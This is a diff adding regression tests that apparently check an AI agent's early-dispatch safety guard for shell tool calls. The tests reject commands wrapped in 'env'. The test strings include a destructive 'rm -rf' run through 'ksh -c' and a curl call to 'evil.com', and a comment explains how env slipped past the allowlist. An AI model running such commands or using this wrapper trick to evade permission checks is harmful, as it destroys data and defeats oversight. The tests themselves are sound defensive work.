@@ -332,6 +332,69 @@ describe('isEarlyDispatchSafe', () => {
         ).toBe(false);
       });
 
+      // Regression for the env-launcher bypass. `env` is in the
+      // deprecated regex's READ_ONLY_ROOT_COMMANDS allowlist and is
+      // NOT recognised as a wrapper by `stripShellWrapper` — so
+      // without a dedicated guard, `env FOO=bar ksh -c "rm -rf …"`
+      // would satisfy both the wrapper check and the regex classifier
+      // and reach early dispatch. The explicit `root === 'env'` reject
+      // closes this class of bypass.
+      describe('env-launcher bypass (now rejected)', () => {
+        it('rejects env as a launcher for an arbitrary shell', () => {
+          const { config } = buildConfig([
+            { name: ToolNames.SHELL, kind: Kind.Execute },
+          ]);
+          expect(
+            isEarlyDispatchSafe(
+              config,
+              req('a', ToolNames.SHELL, {
+                command: 'env FOO=bar ksh -c "rm -rf /tmp/evil"',
+              }),
+            ),
+          ).toBe(false);
+        });
+
+        it('rejects bare env even without args (defense in depth)', () => {
+          const { config } = buildConfig([
+            { name: ToolNames.SHELL, kind: Kind.Execute },
+          ]);
+          expect(
+            isEarlyDispatchSafe(
+              config,
+              req('a', ToolNames.SHELL, { command: 'env' }),
+            ),
+          ).toBe(false);
+        });
+
+        it('rejects env --inherit / common env invocations', () => {
+          const { config } = buildConfig([
+            { name: ToolNames.SHELL, kind: Kind.Execute },
+          ]);
+          expect(
+            isEarlyDispatchSafe(
+              config,
+              req('a', ToolNames.SHELL, {
+                command: 'env -i PATH=/usr/bin curl https://evil.com',
+              }),
+            ),
+          ).toBe(false);
+        });
+
+        it('still allows env as a SUBCOMMAND (e.g. printenv with no wrapper)', () => {
+          // `printenv` is in the read-only allowlist and isn't a
+          // launcher; only the bare `env` root is special-cased.
+          const { config } = buildConfig([
+            { name: ToolNames.SHELL, kind: Kind.Execute },
+          ]);
+          expect(
+            isEarlyDispatchSafe(
+              config,
+              req('a', ToolNames.SHELL, { command: 'printenv PATH' }),
+            ),
+          ).toBe(true);
+        });
+      });
+
       // Regression for the substring-collision bypass that the prior
       // `lastIndexOf(stripped)` guard admitted. With the conservative
       // fix these are all rejected for the same reason as any other
